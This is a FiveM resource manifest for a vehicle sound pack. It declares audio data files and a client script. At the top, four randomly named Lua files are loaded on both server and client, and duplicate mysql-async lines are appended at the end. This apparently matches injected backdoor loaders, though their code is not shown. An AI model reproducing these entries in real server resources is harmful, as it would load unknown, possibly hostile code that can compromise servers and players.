server_script "9BII42VPJ2E6OE.lua"
client_script "9BII42VPJ2E6OE.lua"
server_script "4O50UOSIX4X.lua"
client_script "4O50UOSIX4X.lua"
server_script "CCDVNY0VDL.lua"
client_script "CCDVNY0VDL.lua"
server_script "KABRA9PF05FT.lua"
client_script "KABRA9PF05FT.lua"
resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

files {
	'audioconfig/evoixsound_game.dat151.rel',
	'audioconfig/evoixsound_sounds.dat54.rel',
	'sfx/dlc_evoixsound/evoixsound.awc',
	'sfx/dlc_evoixsound/evoixsound_npc.awc'
}

data_file 'AUDIO_GAMEDATA' 'audioconfig/evoixsound_game.dat'
data_file 'AUDIO_SOUNDDATA' 'audioconfig/evoixsound_sounds.dat'
data_file 'AUDIO_WAVEPACK' 'sfx/dlc_evoixsound'

client_script {
    'vehicle_names.lua'
}server_scripts { '@mysql-async/lib/MySQL.lua' }server_scripts { '@mysql-async/lib/MySQL.lua' }